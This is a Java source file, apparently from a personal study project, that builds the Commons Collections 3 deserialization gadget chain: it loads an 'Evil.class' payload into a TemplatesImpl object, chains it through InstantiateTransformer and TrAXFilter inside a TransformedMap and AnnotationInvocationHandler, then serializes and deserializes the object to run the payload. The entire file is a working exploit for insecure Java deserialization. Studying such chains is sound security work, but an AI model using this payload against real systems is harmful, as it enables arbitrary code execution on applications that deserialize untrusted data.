import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class CC3 {
    public static void main(String[] args) throws Exception
    {
        TemplatesImpl templates = new TemplatesImpl();
        
        Class tcls = templates.getClass();
        Field name = tcls.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "name");

        Field tfactory = tcls.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates, new TransformerFactoryImpl());

        byte[] code = Files.readAllBytes(Paths.get("D:\\CCchain\\target\\classes\\Evil.class"));
        byte[][] codes = {code};
        Field bytecodes = tcls.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates, codes);

//        templates.newTransformer();

//        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
//        instantiateTransformer.transform(TrAXFilter.class);

        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
        });

        Map<Object, Object> map = new HashMap<>();
        map.put("value", "value");
        Map<Object, Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);

        Class<?> cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = cls.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object obj = constructor.newInstance(Target.class, transformedMap);

        serialize(obj);
        unserialize("serialized.bin");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("serialized.bin"));
        objectOutputStream.writeObject(obj);
    }
    public static Object unserialize(String fileName) throws IOException, ClassNotFoundException {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(fileName));
        Object obj = objectInputStream.readObject();
        return obj;
    }
}
